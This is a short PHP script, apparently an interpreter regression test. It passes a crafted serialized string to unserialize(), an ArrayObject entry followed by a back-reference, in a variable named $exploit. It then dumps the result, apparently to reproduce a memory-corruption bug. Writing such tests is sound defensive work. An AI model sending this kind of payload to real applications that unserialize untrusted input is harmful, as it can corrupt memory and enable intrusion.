<?php
$inner = 'x:i:1;a:0:{};m:a:0:{}';
$exploit = 'a:2:{i:0;C:11:"ArrayObject":'.strlen($inner).':{'.$inner.'}i:1;R:5;}';

$data = unserialize($exploit);

for($i = 0; $i < 5; $i++) {
    $v[$i] = 'hi'.$i;
}

var_dump($data);
?>
===DONE===
